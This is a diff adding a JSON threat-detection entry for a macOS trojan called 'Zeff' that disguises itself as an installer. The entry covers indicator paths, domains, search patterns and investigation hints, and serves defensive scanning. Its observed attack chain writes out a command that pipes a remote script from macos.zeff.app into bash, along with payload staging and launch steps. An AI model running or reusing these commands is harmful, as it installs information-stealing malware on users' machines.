@@ -1,0 +1,56 @@
+{
+  "name": "zeff",
+  "title": "Zeff 木马（伪装 macOS 安装器 / 信息窃取）",
+  "severity": "high",
+  "added": "2026-10",
+  "refs": [
+    "微步在线（ThreatBook）对 Zeff.dmg 样本的恶意判定：疑似木马 / 信息窃取程序"
+  ],
+  "attack_chain_observed": [
+    "curl -s 'https://macos.zeff.app/v2/install' | bash",
+    "bash /Volumes/Zeff/Installer.file",
+    "rm -rf /tmp/installer",
+    "cp -r /Volumes/Zeff/.back/installer /tmp/installer",
+    "chmod +x /tmp/installer",
+    "nohup /tmp/installer",
+    "sw_vers / getconf / uname / ioreg 系统信息收集"
+  ],
+  "paths": [
+    { "path": "/tmp/installer", "note": "沙箱行为中的落地安装器路径（常见已删除）" },
+    { "path": "/private/tmp/installer", "note": "/tmp 的真实路径（macOS 上 /tmp → /private/tmp）" },
+    { "path": "/Volumes/Zeff/Installer.file", "note": "挂载卷内的安装器包装脚本" },
+    { "path": "/Volumes/Zeff/.back/installer", "note": "挂载卷内隐藏备份目录中的真实载荷" },
+    { "path": "/Volumes/Zeff", "note": "Zeff 挂载卷是否仍挂载" },
+    { "path": "/tmp/installer.dmg", "note": "可能的中间落盘 DMG" },
+    { "path": "/private/tmp/installer.dmg", "note": "可能的中间落盘 DMG（真实路径）" }
+  ],
+  "path_globs": [
+    "/tmp/installer*",
+    "/private/tmp/installer*",
+    "$HOME/Downloads/Zeff.dmg",
+    "$HOME/Downloads/Zeff*.dmg",
+    "$HOME/Desktop/Zeff.dmg",
+    "$HOME/Library/Caches/*zeff*",
+    "$HOME/Library/Application Support/*zeff*",
+    "$HOME/Library/LaunchAgents/*zeff*",
+    "/Library/LaunchAgents/*zeff*",
+    "/Library/LaunchDaemons/*zeff*"
+  ],
+  "strings": [
+    { "pattern": "macos.zeff.app", "where": ["process", "persistence", "history", "logs", "files"] },
+    { "pattern": "zeff.app/v2/install", "where": ["process", "persistence", "history", "logs", "files"] },
+    { "pattern": "Zeff.dmg", "where": ["history", "logs", "files"] },
+    { "pattern": "Installer.file", "where": ["process", "history", "logs"] },
+    { "pattern": "/Volumes/Zeff", "where": ["process", "history", "logs"] }
+  ],
+  "domains": ["macos.zeff.app", "zeff.app"],
+  "urls": ["https://macos.zeff.app/v2/install"],
+  "sha256": [],
+  "_sha256_note": "未获取到可信样本哈希前，此处保持为空。禁止编造哈希。",
+  "investigation_hints": [
+    "nohup 只让进程忽略 SIGHUP 并脱离终端，不等于建立开机持久化。",
+    "文件已删除或卷已卸载时，当前文件系统检查无法证明其过去不存在。",
+    "当前没有异常外联不能排除过去发生过数据外传。",
+    "命中只代表「值得调查」，需结合签名、路径、父子进程、时间线综合判断。"
+  ]
+}
